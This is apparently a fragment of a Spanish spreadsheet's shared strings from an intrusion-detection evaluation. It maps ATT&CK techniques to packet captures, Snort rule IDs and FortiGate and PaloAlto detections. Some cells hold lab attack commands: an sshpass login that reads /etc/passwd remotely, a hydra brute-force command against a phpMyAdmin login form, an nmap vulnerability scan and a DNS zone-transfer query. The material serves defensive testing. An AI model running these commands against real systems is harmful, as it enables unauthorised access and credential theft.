    <t>Transferencia mediante FTP de ficheros entre dos equipos</t>
  </si>
  <si>
    <t>Manual [5] /  4.7.2</t>
  </si>
  <si>
    <t>Manual [5] / C.16</t>
  </si>
  <si>
    <t>Manual [5] /  5.9.4</t>
  </si>
  <si>
    <t>La transferencia de herramientas entre equipos no necesariamente implica un ataque.</t>
  </si>
  <si>
    <t>2000418, 2002752, 2002749, 2051116, 2000418, 2011803</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>FortiGate detecta adecuadamente el uso de comandos de forma remota, pero la técnica no tiene como objetivo del ataque esta acción, sino la transferencia lateral de herramientas. Esta última no es detectada por FortiGate.</t>
    </r>
  </si>
  <si>
    <t>Non-Standard Port</t>
  </si>
  <si>
    <t>T1571</t>
  </si>
  <si>
    <t>Sesión SSH en puerto 2200</t>
  </si>
  <si>
    <t>ssh</t>
  </si>
  <si>
    <t>T1571-SSH_[2].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte el uso de SSH sobre un puerto no estándar</t>
  </si>
  <si>
    <t>Establecer una sesion SSH sobre un puerto no estandar. Comando: sshpass -p salas ssh salas@192.168.2.2 -p 2200 cat /etc/passwd</t>
  </si>
  <si>
    <t>Manual [2] /  3.1.9.1</t>
  </si>
  <si>
    <t>Manual [5] / C.35</t>
  </si>
  <si>
    <t>El uso de SSH en otros puertos es una acción legítima muy común en ciertos entornos</t>
  </si>
  <si>
    <t>2002752, 2002749, 13586</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Detección APP-CTRL: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Si bien es cierto que FG no indica expresamente que la sesión SSH se está estableciendo en un puerto alto, el control de aplicaciones marca tanto el uso de SSH como el del puerto 2200, por lo que debe darse por válida</t>
    </r>
  </si>
  <si>
    <t>Protocol Tunneling</t>
  </si>
  <si>
    <t>T1572</t>
  </si>
  <si>
    <t>Tunelizar la conexión al C2 Server mediante SSH</t>
  </si>
  <si>
    <t>SSH, Metasploit</t>
  </si>
  <si>
    <t>T1572-Protocol_Tunneling_[5].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte el uso de un protocolo para tunelizar comunicaciones C&amp;C</t>
  </si>
  <si>
    <t>Tunelizar una conexion mediante SSH</t>
  </si>
  <si>
    <t>Manual [5] / 4.8.6</t>
  </si>
  <si>
    <t>Manual [5] / C.17</t>
  </si>
  <si>
    <t>Manual [5] /  5.11.12</t>
  </si>
  <si>
    <t>La tunelización de un canal no necesariamente es un ataque. Un administrador de red puede utilizar SSH por ejemplo para acceder a otro equipo y es lo mismo que un atacante realizaría</t>
  </si>
  <si>
    <t>2002752, 2002749, 2000418, 2011803</t>
  </si>
  <si>
    <t>2000418, 2011803</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>FortiGate detecta el uso de comandos de forma remota, pero no detecta el uso de SSH como túnel para el envío de comandos. Por tanto, esto se considera una detección de ataque colateral satisfactoria, pero no así para el ataque principal</t>
    </r>
  </si>
  <si>
    <t>psexec -- remote-acess</t>
  </si>
  <si>
    <t>Además de la alerta generada mediante IPS del intento de login SSH, se detecta un acceso remoto mediante control de aplicaciones</t>
  </si>
  <si>
    <t>Encrypted Channel</t>
  </si>
  <si>
    <t>T1573</t>
  </si>
  <si>
    <t>Asymetric Cryptography</t>
  </si>
  <si>
    <t>T1573.002</t>
  </si>
  <si>
    <t>Encriptar conexion con C2 Server</t>
  </si>
  <si>
    <t>Metasploit, OpenSSL</t>
  </si>
  <si>
    <t>T1573.002-AsymetricCryptography_[5].pcapng</t>
  </si>
  <si>
    <t>SSL</t>
  </si>
  <si>
    <t>Deteccion por anomalías, monitorizando la creacion de nuevas conexiones</t>
  </si>
  <si>
    <t>Encriptar conexion al C2 Server</t>
  </si>
  <si>
    <t>Manual [5] / 4.8.7</t>
  </si>
  <si>
    <t>Manual [5] / C.18</t>
  </si>
  <si>
    <t>Manual [5] /  5.11.13</t>
  </si>
  <si>
    <t>Encriptar un canal no necesariamente es un ataque.  Un administrador de red puede utilizar SSH por ejemplo para acceder a otro equipo y es lo mismo que un atacante realizaría</t>
  </si>
  <si>
    <t>Resource Development</t>
  </si>
  <si>
    <t>TA0042</t>
  </si>
  <si>
    <t>Compromise Infrastructure</t>
  </si>
  <si>
    <t>T1584</t>
  </si>
  <si>
    <t>DNS Server</t>
  </si>
  <si>
    <t>T1584.002</t>
  </si>
  <si>
    <t>Envenenamiento de Caché DNS</t>
  </si>
  <si>
    <t>T1584-Cache_dns_[1].pcapng</t>
  </si>
  <si>
    <t>Una vez el servidor DNS se encuentra comprometido, no es posible determinar si las redirecciones basadas en una caché envenenada son maliciosas o no</t>
  </si>
  <si>
    <t>Manual [1] /  2.4.1.1.5</t>
  </si>
  <si>
    <t>Manual [1] / E.16</t>
  </si>
  <si>
    <t>Manual [5] / 5.2.3.1</t>
  </si>
  <si>
    <t>El envenenamiento de la cache DNS siempre es un ataque</t>
  </si>
  <si>
    <t>29456, 384</t>
  </si>
  <si>
    <t>29456, 384, 13249</t>
  </si>
  <si>
    <t>29456, 384, 13249, 2100469, 2100384, 2002752, 2002749</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: la herramienta tranalyzer considera los dos mensajes ICMP como pertenecientes al mismo flujo pero Snortv3 detecta ambos como flujos distintos. Al mismo tiempo Snortv2 no los analiza. Adicionalmente ni Snortv3 ni Snortv2 tienen en cuenta los dos flujos hpext que tranalyzer sí considera. En balance, Snortv3 detecta 1 flujo menos y Snortv2 3 menos. Ninguno de estos flujos es relevante.</t>
    </r>
  </si>
  <si>
    <t>Secuestro / Redireccionamiento DNS</t>
  </si>
  <si>
    <t>T1584-Secuestro_dns_[1].pcapng</t>
  </si>
  <si>
    <t>Manual [1] /  2.4.1.1.4</t>
  </si>
  <si>
    <t>Manual [1] / E.15</t>
  </si>
  <si>
    <t>El secuestro DNS siempre es un ataque</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Contaje Mensajes</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">: el CSV de alertas identifica dos paquetes distintos con el mismo IDPaq (porque el contenido de los paquetes es idéntico), causando que el cálculo devuelva menos mensajes que flujos. Se ha arreglado esta errata de forma manual (RS3: 1 mensaje → 2 mensajes // RS4: 2 mensajes → 3 mensajes)                                                              </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv3 desagrupa los dos paquetes ICMP en dos flujos, mientras que tranalyzer los considera uno sólo. Snortv2 no los analiza.</t>
    </r>
  </si>
  <si>
    <t>Botnet</t>
  </si>
  <si>
    <t>T1584.005</t>
  </si>
  <si>
    <t xml:space="preserve">Uso de Botnet </t>
  </si>
  <si>
    <t>T1584.005-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>La detección debe centrarse en otras fases del ciclo de vida de un ataque, como Phishing, DDoS...</t>
  </si>
  <si>
    <t>Uso de Ares y screenshots y key logging    https://www.unb.ca/cic/datasets/ids-2018.html</t>
  </si>
  <si>
    <t>El uso de Botnet siempre es un atauqe</t>
  </si>
  <si>
    <t>1413, 1417, 254, 1448, 1917, 2049, 29456, 31136, 384, 385, 42340, 449, 566</t>
  </si>
  <si>
    <t>1448, 254, 1917, 29456, 384, 408, 449, 1413, 1417, 385, 2049, 566, 31136, 2001330, 2013479, 2001972, 2102465, 2102466, 2011716, 2008578, 2012709, 2027390, 2025275, 2027413, 2017515, 2015856, 2101413, 2010937, 2100566, 2010935, 2003068, 2001219, 2012296, 2010939</t>
  </si>
  <si>
    <t>2001330, 2013479, 2001972, 2102465, 2102466, 2011716, 2008578, 2012709, 2027390, 2025275, 2027413, 2017515, 2015856, 2101413, 2010937, 2100566, 2010935, 2003068, 2001219, 2012296, 2010939, 1448, 254, 57756, 44487, 44485, 44489, 44486, 44484, 44488, 1917, 28993, 29456, 384, 408, 32481, 41379, 29957, 44416, 449, 4060, 36376, 40186, 52625, 45941, 25664, 41742, 50447, 1413, 1417, 385, 2049, 566, 15850, 31136, 23493</t>
  </si>
  <si>
    <t xml:space="preserve">1448, 254, 57756, 44487, 44485, 44489, 44486, 44484, 44488, 1917, 28993, 29456, 384, 408, 32481, 41379, 29957, 44416, 449, 4060, 36376, 40186, 52625, 45941, 25664, 41742, 50447, 1413, 1417, 385, 2049, 566, 15850, 31136, 23493, 2002749, 2002752, 2101448, 2101447, 2001329, 2001330, 2003020, 2009582, 2100254, 2003012, 2003006, 2013479, 2001972, 2044666, 2023997, 2102465, 2102466, 2101917, 2100486, 2022218, 2014384, 2001117, 2011716, 2008578, 2100384, 2100408, 2027759, 2102925, 2100449, 2100615, 2012709, 2034857, 2009207, 2027390, 2025275, 2009206, 2009205, 2009208, 2027413, 2100469, 2043304, 2017515, 2015856, 2101413, 2101417, 2100385, 2102049, 2010937, 2100566, 2010935, 2003068, 2001219, 2012296, 2003099, 2010939
</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Mensajes e Instancias con Ataque</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">: Los numeros de mensajes e instancias con ataque de la captura resulta dificil de detectar debido a que es un ataque realizado por CIC. Por la naturaleza del ataque y el uso de tráfico cifrado resulta imposible determinar estos valores con certeza. Por defecto los dejamos a 1.                                                                                                                                                                     </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">: por lo comentado en el punto anterior, tampoco resulta viable proporcionar una explicación fiable acerca de la diferencia en los flujos detectados por ambas versiones de Snort y tranalyzer.                                                                                             </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Análisis Manual</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: este ataque, debido al gran número de alertas generadas y al tamaño del fichero no ha podido analizarse manualmente. Los resultados automáticos contarán pero no se contabilizarán los SIDs para las tablas de análisis</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">vimeo-base -- photo video / ms-rdp -- remote access / </t>
  </si>
  <si>
    <t>9999, 14984, 14978,</t>
  </si>
  <si>
    <t>PaloAlto detecta el uso de una aplicación relacionada con fotos y videos (en el ataque se realizan Screenshots) y el acceso remoto mediante RDP.</t>
  </si>
  <si>
    <t>Establish Accounts</t>
  </si>
  <si>
    <t>T1585</t>
  </si>
  <si>
    <t>Social Media Accounts</t>
  </si>
  <si>
    <t>T1585.001</t>
  </si>
  <si>
    <t>Creación de cuentas de redes sociales</t>
  </si>
  <si>
    <t>Sitios web convencionales (Facebook, Github, Microsoft ...)</t>
  </si>
  <si>
    <t>T1585.001-Establish_social_accounts_[4].pcapng</t>
  </si>
  <si>
    <t>Siempre y cuando el origen sea la red a proteger, detección por anomalías que identifique un incipiente aumento de las peticiones a servidores de redes sociales.</t>
  </si>
  <si>
    <t>Manual [4] /  3.2</t>
  </si>
  <si>
    <t>Manual [4] / B.2</t>
  </si>
  <si>
    <t>Manual [4] / 4.2</t>
  </si>
  <si>
    <t>La creación de cuentas de redes sociales es una acción totalmente legítima en ciertos contextos</t>
  </si>
  <si>
    <t>93031, 9999</t>
  </si>
  <si>
    <t>Compromise Accounts</t>
  </si>
  <si>
    <t>T1586</t>
  </si>
  <si>
    <t>T1586.001</t>
  </si>
  <si>
    <t>Fuerza bruta para acceso a web</t>
  </si>
  <si>
    <t>T1586.001-Compromise_Accounts_[2].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte un ataque de fuerza bruta en base al envío masivo de peticiones de acceso a una página web</t>
  </si>
  <si>
    <t>Ataque de fuerza bruta a formulario de acceso a página web phpMyAdmin. Comando: hydra -l root -P /usr/share/john/password.lst 192.168.2.2 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&amp;pma_password=^PASS^:#1045 Cannot log in to the MySQL server"</t>
  </si>
  <si>
    <t>Manual [2] / 3.1.2.1</t>
  </si>
  <si>
    <t>Manual [5] / C.36</t>
  </si>
  <si>
    <t>Manual [2] / 4.2.1.3</t>
  </si>
  <si>
    <t>El uso de la fuerza bruta para acceder a una página web siempre es un ataque</t>
  </si>
  <si>
    <t>1434, 1433, 1201, 1129, 1071, 2062, 43285, 1288, 940, 937, 1662, 1489, 1145, 1301, 879, 1218, 845, 1213, 885, 1206, 882, 1231, 1543, 1551, 839, 825, 1016, 1141, 1606, 993, 886, 1877, 895, 1852, 1520, 1521, 835, 849, 896, 1826, 853, 43290, 887, 1025</t>
  </si>
  <si>
    <t>1434, 1433, 1201, 1129, 1071, 2062, 43285, 1288, 940, 937, 1662, 1489, 1145, 1301, 879, 1218, 845, 1213, 885, 1206, 882, 1231, 1543, 1551, 839, 825, 1016, 1141, 1606, 993, 886, 1877, 895, 1852, 1520, 1521, 835, 849, 896, 1826, 853, 43290, 887, 1025, 2049402, 2027261, 2022520, 2101201, 2101129, 2101071, 2027250, 2101145, 2018413, 2010229, 2101016, 2100993, 2019526, 2101877, 2027263</t>
  </si>
  <si>
    <t>50447, 1434, 1433, 1201, 1129, 1071, 2062, 43285, 1288, 41742, 940, 937, 33608, 1662, 1489, 1145, 1301, 879, 1218, 845, 1213, 885, 1206, 882, 1231, 1543, 1551, 839, 825, 1016, 1141, 1606, 993, 886, 42289, 59258, 1877, 895, 1852, 1520, 1521, 835, 849, 896, 1826, 853, 43290, 887, 1025, 2049402, 2027261, 2022520, 2101201, 2101129, 2101071, 2027250, 2101145, 2018413, 2010229, 2101016, 2100993, 2019526, 2101877, 2027263</t>
  </si>
  <si>
    <t>50447, 1434, 1433, 1201, 1129, 1071, 2062, 43285, 1288, 41742, 940, 937, 33608, 1662, 1489, 1145, 1301, 879, 1218, 845, 1213, 885, 1206, 882, 1231, 1543, 1551, 839, 825, 1016, 1141, 1606, 993, 886, 42289, 59258, 1877, 895, 1852, 1520, 1521, 835, 849, 896, 1826, 853, 43290, 887, 1025, 2002752, 2002749, 2010706, 2049402, 2027261, 2022520, 2101201, 2101129, 2101071, 2009885, 2027250, 2101288, 2100937, 2101662, 2101489, 2101145, 2018413, 2010229, 2008330, 2000560, 2100884, 2101016, 2100993, 2010377, 2019526, 2101877, 2101852, 2027263, 2101620, 2009749</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">: Snortv2 no analiza el flujo ICMPv6 de la captura. Este flujo no es relevante para el ataque, por lo que no afecta a los resultados finales.                                                     </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Análisis Manual</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: este ataque, debido al gran número de alertas generadas y al tamaño del fichero no ha podido analizarse manualmente. Los resultados automáticos contarán pero no se contabilizarán los SIDs para las tablas de análisis</t>
    </r>
  </si>
  <si>
    <t>12648, 29263, 12475, 29264, 13900, 29261</t>
  </si>
  <si>
    <t>PaloAlto detecta las URL como amenazas individuales. Al existir tal cantidad de alertas, se puede deducir que existe un ataque de este tipo. Sin embargo, no existe una alerta que detecte un ataque DDoS así como tal.</t>
  </si>
  <si>
    <t>Reconnaissance</t>
  </si>
  <si>
    <t>TA0043</t>
  </si>
  <si>
    <t>Gather Victim Identity Information</t>
  </si>
  <si>
    <t>T1589</t>
  </si>
  <si>
    <t>Email Addresses</t>
  </si>
  <si>
    <t>T1589.002</t>
  </si>
  <si>
    <t>Recogida de cuentas de correo eléctronico y validación de las mismas</t>
  </si>
  <si>
    <t>theHarvester, bulk-email-verifier</t>
  </si>
  <si>
    <t>T1589.002-Gather_victim_identity_information_[4].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte un número elevado de intentos de conexión y mensajes ehlo SMTP procedentes de un mismo origen hacia un servidor, con diferentes destinatarios.</t>
  </si>
  <si>
    <t>Manual [4] / 3.1</t>
  </si>
  <si>
    <t>Manual [4] / B.1</t>
  </si>
  <si>
    <t>Manual [4] / 4.1</t>
  </si>
  <si>
    <t>La recogida de cuentas de correo electrónico así como la comprobación de su validez puede considerarse como acción legítima en algunos contextos</t>
  </si>
  <si>
    <t>smtp-base -- email (risk of app = 5)</t>
  </si>
  <si>
    <t>Active Scanning</t>
  </si>
  <si>
    <t>T1595</t>
  </si>
  <si>
    <t>Vulnerability Scanning</t>
  </si>
  <si>
    <t>T1595.002</t>
  </si>
  <si>
    <t>Escaneo de vulnerabilidades</t>
  </si>
  <si>
    <t>T1595.002-Port_Scanning_[3].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte el envío de paquetes TCP con flag SYN activado a varios puertos diferentes, sin respuesta del atacante a los ACK posteriores.</t>
  </si>
  <si>
    <t>Ejecución de comando nmap para escaneo de puertos y detección de vulnerabilidades (nmap -sV --script vulscan IP)</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.2</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.2.4 y Manual [5] / C.37</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.2.5</t>
  </si>
  <si>
    <t>Un escaneo exhaustivo de puertos constituye un ataque</t>
  </si>
  <si>
    <t>2010937, 2002911, 2010939, 2010935, 2002910, 1421, 2010936, 1418, 2023753, 2018317, 2034718, 2013409, 2034730, 2009358, 2024364</t>
  </si>
  <si>
    <t>2013409, 2034730, 2034718</t>
  </si>
  <si>
    <t>2010939, 1421, 2010936, 1418, 2018317, 2009358, 2024364, 2023753</t>
  </si>
  <si>
    <t>1421, 1418, 44484, 44487, 44485, 44489, 41807, 49040, 50447, 2010937, 2002911, 2010939, 2010935, 2002910, 2010936, 2023753, 2018317, 2034718, 2013409, 2034730, 2009358, 2024364</t>
  </si>
  <si>
    <t>49040, 2013409, 2034730, 2034718, 44484, 44485, 44487, 44489, 50447, 41807, 1418, 1421</t>
  </si>
  <si>
    <t>49040, 2013409, 2034730, 2034718</t>
  </si>
  <si>
    <t>44484, 44485, 44487, 44489, 50447, 41807, 1421, 1418</t>
  </si>
  <si>
    <t>2010937, 2002911, 2010939, 2010935, 2002910, 2010936, 2023753, 2018317, 2009358, 2024364</t>
  </si>
  <si>
    <t>2002752, 2002749, 2010937, 2001689, 2002911, 2010939, 2010935, 2002910, 2100472, 2100615, 2010936, 2101418, 2006408, 2044666, 2023753, 2007571, 2003099, 2018317, 2034718, 2013409, 2034730, 2009358, 2024364, 1421, 1418, 44484, 44487, 44485, 44489, 41807, 50447</t>
  </si>
  <si>
    <t>49040, 2013409, 2034730, 2034718, 2003099, 2007571, 2100615, 44484, 44485, 44487, 44489, 50447, 2002749, 2002752, 2006408, 2100472, 2101418, 41807</t>
  </si>
  <si>
    <t>49040, 2013409, 2034730, 2034718, 2003099, 2007571, 2100615</t>
  </si>
  <si>
    <t>44484, 44485, 44487, 44489, 50447, 2002749, 2002752, 2006408, 2100472, 2101418, 41807</t>
  </si>
  <si>
    <t>2010937, 2001689, 2002911, 2010939, 2010935, 2002910, 2010936, 2044666, 2023753, 2018317, 2009358, 2024364, 1421, 1418</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Instancias Ataque:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> El ataque consiste en la ejecución de un comando nmap que escanea un rango extenso de puertos comunes. Cada uno de estos descubrimientos es considerado de forma independiente como instancia de ataque.                                                                      </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza el flujo ICMP, por lo que detecta 1 flujo menos que el total. Este flujo no es relevante, por lo que no hay diferencias en la detección</t>
    </r>
  </si>
  <si>
    <t>43814, 45360</t>
  </si>
  <si>
    <t>portmapper -- infrastructure</t>
  </si>
  <si>
    <t>35364, 9999, 30520, 59582, 94318, 94317, 58433</t>
  </si>
  <si>
    <t>94318, 94317, 58433</t>
  </si>
  <si>
    <t>35364, 9999, 30520, 59582</t>
  </si>
  <si>
    <t>2033</t>
  </si>
  <si>
    <t>Wordlist Scanning</t>
  </si>
  <si>
    <t>T1595.003</t>
  </si>
  <si>
    <t>Escaneo de página web</t>
  </si>
  <si>
    <t>Dirb</t>
  </si>
  <si>
    <t>T1595.003-Web_page_scanning1_[2].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte peticiones HTTP hacia muchas URLs diferentes con destino el mismo servidor</t>
  </si>
  <si>
    <t>Manual [2] /   3.1.1.1</t>
  </si>
  <si>
    <t>Manual [5] / C.38</t>
  </si>
  <si>
    <t>Manual [2] / 4.1.1.1</t>
  </si>
  <si>
    <t>Un escaneo exhaustivo de una página web siempre es un ataque</t>
  </si>
  <si>
    <t>2049402, 2027261, 2022520, 2101201, 2101129, 2101071, 2027250, 2101145, 2018413, 2010229, 2101016, 2100993, 2019526, 2101877, 2027263, 50447, 1434, 1433, 1201, 1129, 1071, 2062, 43285, 1288, 41742, 940, 937, 33608, 1662, 1489, 1145, 1301, 879, 1218, 845, 1213, 885, 1206, 882, 1231, 1543, 1551, 839, 825, 1016, 1141, 1606, 993, 886, 42289, 59258, 1877, 895, 1852, 1520, 1521, 835, 849, 896, 1826, 853, 43290, 887, 1025</t>
  </si>
  <si>
    <t>50447, 1434, 1433, 1201, 1129, 1071, 2062, 43285, 1288, 41742, 940, 937, 33608, 1662, 1489, 1145, 1301, 879, 1218, 845, 1213, 885, 1206, 882, 1231, 1543, 1551, 839, 825, 1016, 1141, 1606, 993, 886, 42289, 59258, 1877, 895, 1852, 1520, 1521, 835, 849, 896, 1826, 853, 43290, 887, 1025, 2002752, 2002749, 2010706, 2049402, 2027261, 2022520, 2101201, 2101129, 2101071, 2009885, 2027250, 2101288, 2100937, 2101662, 2101489, 2101145, 2018413, 2010229, 2008330, 2000560, 2100884, 2101016, 2100993, 2010377, 2019526, 2101877, 2101852, 2027263, 2009749, 2101620</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Instancias Ataque</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Cada URL escaneada es considerada como una instancia de ataque.</t>
    </r>
  </si>
  <si>
    <t>9999, 40129, 56610, 59420</t>
  </si>
  <si>
    <t>9999, 40129, 59420</t>
  </si>
  <si>
    <t>GoBuster</t>
  </si>
  <si>
    <t>T1595.003-Web_page_scanning2_[3].pcapng</t>
  </si>
  <si>
    <t xml:space="preserve">Ejecucion de comando GoBuster para escaneo de la estructura de directorios </t>
  </si>
  <si>
    <t>Manual [3] / 3.8.4</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.4.4 y Manual [5] / C.39</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.4.5</t>
  </si>
  <si>
    <t>1434, 1433, 1129, 1071, 1201, 2062, 43285, 1288, 940, 937, 1662, 1489, 1145, 1301, 879, 1218, 845, 1213, 885, 1206, 882, 1231, 1543, 1551, 839, 825, 1016, 1141, 1606, 993, 886, 1877, 895, 1852, 1520, 1521, 835, 849, 896, 1826, 853, 43290, 887</t>
  </si>
  <si>
    <t>2101129, 2101071, 2027261, 2022520, 2101201, 2027250, 2101145, 2010229, 2101016, 2100993, 2019526, 2101877, 2027263, 1434, 1433, 1129, 1071, 1201, 2062, 43285, 1288, 940, 937, 1662, 1489, 1145, 1301, 879, 1218, 845, 1213, 885, 1206, 882, 1231, 1543, 1551, 839, 825, 1016, 1141, 1606, 993, 886, 1877, 895, 1852, 1520, 1521, 835, 849, 896, 1826, 853, 43290, 887, 2049402</t>
  </si>
  <si>
    <t>2101129, 2101071, 2027261, 2022520, 2101201, 2027250, 2101145, 2010229, 2101016, 2100993, 2019526, 2101877, 2027263, 1434, 1433, 1129, 1071, 1201, 2062, 43285, 1288, 940, 937, 1662, 1489, 1145, 1301, 879, 1218, 845, 1213, 885, 1206, 882, 1231, 1543, 1551, 839, 825, 1016, 1141, 1606, 993, 886, 1877, 895, 1852, 1520, 1521, 835, 849, 896, 1826, 853, 43290, 887, 50447, 41742, 33608, 42289, 59258,  2049402</t>
  </si>
  <si>
    <t>2002752, 2002749, 2101129, 2101071, 2027261, 2022520, 2101201, 2009885, 2027250, 2101288, 2100937, 2101662, 2101489, 2101145, 2010229, 2008330, 2000560, 2100884, 2101016, 2100993, 2010377, 2019526, 2101877, 2101852, 2027263, 1434, 1433, 1129, 1071, 1201, 2062, 43285, 1288, 940, 937, 1662, 1489, 1145, 1301, 879, 1218, 845, 1213, 885, 1206, 882, 1231, 1543, 1551, 839, 825, 1016, 1141, 1606, 993, 886, 1877, 895, 1852, 1520, 1521, 835, 849, 896, 1826, 853, 43290, 887, 50447, 41742, 33608, 42289, 59258, 2049402</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Instancias Ataque</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">: Cada URL escaneada es considerada como una instancia de ataque.                           </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Análisis Manual:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> este ataque, debido al gran número de alertas generadas y al tamaño del fichero no ha podido analizarse manualmente. Los resultados automáticos contarán pero no se contabilizarán los SIDs para las tablas de análisis</t>
    </r>
  </si>
  <si>
    <t>Search Open Technical Databases</t>
  </si>
  <si>
    <t>T1596</t>
  </si>
  <si>
    <t>DNS/Passive DNS</t>
  </si>
  <si>
    <t>T1596.001</t>
  </si>
  <si>
    <t>Transferencia de zona DNS</t>
  </si>
  <si>
    <t>T1596.001-DNS_Transfer_[2].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte paquetes TCP dirigidos al puerto 53 que tengan los bytes "Question" igual a 1 y el resto a cero. Además, el campo "Type" debe tomar el valor "00 FC"</t>
  </si>
  <si>
    <t>Ejecución de comando para obtener informacion de la víctima (host -l javier.example.com IP)</t>
  </si>
  <si>
    <t>Manual [2] / 3.1.1.2</t>
  </si>
  <si>
    <t>Manual [5] / C.40</t>
  </si>
  <si>
    <t>Manual [2] / 4.2.1.2</t>
  </si>
  <si>
    <t>El uso de DNS para realizar una transferencia de zona siempre es un ataque</t>
  </si>
  <si>
    <t>2002752, 2002749, 2100255, 255</t>
  </si>
  <si>
    <t>2100255, 255</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
